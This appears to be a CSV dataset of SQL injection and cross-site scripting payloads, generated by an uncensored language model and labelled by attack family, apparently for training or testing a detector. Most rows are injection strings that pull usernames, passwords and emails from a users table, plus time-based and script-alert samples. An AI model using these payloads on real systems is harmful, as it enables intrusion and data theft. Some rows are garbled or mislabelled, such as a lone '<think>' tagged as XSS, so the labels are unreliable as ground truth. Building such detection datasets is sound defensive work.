payload,attack_type,attack_family,seed,round,matched_rules,label,generator,model_tag,payload_sha256
AND 1=1,sqli,boolean_blind,42,1,,1,deepseek-r1,huihui_ai/deepseek-r1-abliterated:14b-qwen-distill,03269be5799ba7c45133416a6a4b22f096839bc4ea3b7a0a981927d37d6ff2e1
AND 1=2,sqli,boolean_blind,42,1,,1,deepseek-r1,huihui_ai/deepseek-r1-abliterated:14b-qwen-distill,8875508721451315267a40d9539ffd474d2017be9e89a12f26a37abc70c3e4da
' AND 1=1,sqli,boolean_blind,42,1,,1,deepseek-r1,huihui_ai/deepseek-r1-abliterated:14b-qwen-distill,2440b79a550401a0c921a920e79f76403d6ac5053c952a04f7742fc678df65d3
' AND 1=2,sqli,boolean_blind,42,1,,1,deepseek-r1,huihui_ai/deepseek-r1-abliterated:14b-qwen-distill,2f5cbc5f3ba62b97adfb14165a434e63f9bc3c5b85846bf33228e2fb4ebaec9d
OR 1=1,sqli,boolean_blind,42,1,,1,deepseek-r1,huihui_ai/deepseek-r1-abliterated:14b-qwen-distill,f73da348b809c12f88363a3bc8367e87c3ea11367aab494fa2e6651bc2794fd6
OR 1=2,sqli,boolean_blind,42,1,,1,deepseek-r1,huihui_ai/deepseek-r1-abliterated:14b-qwen-distill,b11382aabc5e20c76c8ec9969f2c90474d831ce34287d2302776676b6398ca4c
' OR 1=1,sqli,boolean_blind,42,1,,1,deepseek-r1,huihui_ai/deepseek-r1-abliterated:14b-qwen-distill,deeb0c4f47c8ef24a4884a02b593d1d79a133d7736d134ecd696ed0c9d3d1a6b
' OR 1=2,sqli,boolean_blind,42,1,,1,deepseek-r1,huihui_ai/deepseek-r1-abliterated:14b-qwen-distill,9e0e04f4e33ad630350cc792650002f9d33f40f03aa588812df790207a433caf
' OR =1,sqli,boolean_blind,42,1,,1,deepseek-r1,huihui_ai/deepseek-r1-abliterated:14b-qwen-distill,b21c7ee56129cfd49c0352195be57bd9d7370474e12546c0dccb2b7f0bdabfad
"1' UNION SELECT username, password FROM users--",sqli,union_based,43,1,,1,deepseek-r1,huihui_ai/deepseek-r1-abliterated:14b-qwen-distill,18f67b067c8e05bd20ffea6bc01c4547afa98e1b90ae58ea4f13e83ece524571
"1 UNION ALL SELECT table_name, column_name FROM information_schema.columns--",sqli,union_based,43,1,,1,deepseek-r1,huihui_ai/deepseek-r1-abliterated:14b-qwen-distill,07fa35929354ac9e2013b1fff085689df1b9cfe717ad1419357f53f2fcdb9c4f
"1' UNION SELECT name, email FROM users--",sqli,union_based,43,1,,1,deepseek-r1,huihui_ai/deepseek-r1-abliterated:14b-qwen-distill,4258e7f3818973c1f46d7193ac9e466386a2466cdcf42fbf2a723b3906e2d27a
"1' UNION SELECT id, name, email FROM users--",sqli,union_based,43,1,,1,deepseek-r1,huihui_ai/deepseek-r1-abliterated:14b-qwen-distill,09e0343efe04fb5ac80da1e05fec139f117b4bdbe5bb18c817154bd784751cfc
1' UNION SELECT * FROM users--,sqli,union_based,43,1,,1,deepseek-r1,huihui_ai/deepseek-r1-abliterated:14b-qwen-distill,256e290d5eee78febde470a430233643d3b0795e7618f6e11b59544a43fe5cb6
"1' UNION SELECT username, password FROM users LIMIT 1--",sqli,union_based,43,1,,1,deepseek-r1,huihui_ai/deepseek-r1-abliterated:14b-qwen-distill,7ecdde407f48ba963ac075109e4c722d0e3f93f84fed1ad9c02d3f0bf0395c1e
"1' UNION SELECT name, birthdate FROM users--",sqli,union_based,43,1,,1,deepseek-r1,huihui_ai/deepseek-r1-abliterated:14b-qwen-distill,0990fdda51a2239209d82a58579f2e4fcbe541cd4f04766d2ca216aa4392bff6
"1' UNION SELECT id, username, password FROM users--",sqli,union_based,43,1,,1,deepseek-r1,huihui_ai/deepseek-r1-abliterated:14b-qwen-distill,e2e40c547664a50b15174e7330d475572d62ab92dc5a5fc1da6a60f228884e97
"1' UNION SELECT column1, column2 FROM table_name--",sqli,union_based,43,1,,1,deepseek-r1,huihui_ai/deepseek-r1-abliterated:14b-qwen-distill,fb1fbc2c99c8de6592298f2e24275fb89366608da63f178f1c62fa89cc4cb069
"1' UNION SELECT name, address FROM users--",sqli,union_based,43,1,,1,deepseek-r1,huihui_ai/deepseek-r1-abliterated:14b-qwen-distill,c8b62ccbae6ab4d1a989520c3b1724f7da105cc2f7f8b6dd19dbdf37922c2a0e
"' UNION SELECT NULL,SLEEP(5)--",sqli,time_based_blind,44,1,,1,deepseek-r1,huihui_ai/deepseek-r1-abliterated:14b-qwen-distill,78b6000116374eccb6c1e2d6461780c67721660844d7216db29d94ac826e8571
<think>,xss,reflected,42,1,,1,deepseek-r1,huihui_ai/deepseek-r1-abliterated:14b-qwen-distill,7d329bb7d9d43bf17bcafd4cb8203e1b94423923e87980bd1d2d9fc525d50b99
"[""Hello"", ""world"", ""Hello <script>alert('Hello!');</script>"", ""Hello"" + ""world"", ""Hello &amp;world"", ""Hello <b>world</b>"", ""Hello 'world'"", ""Hello \""world\"""", ""Hello <i>world</i>"", ""Hello <u>world</u>""]",xss,reflected,42,1,,1,deepseek-r1,huihui_ai/deepseek-r1-abliterated:14b-qwen-distill,f2c07074ff5f6034654a713e76b078328628180b2fdc1c15fcdb7ce786b4ed80
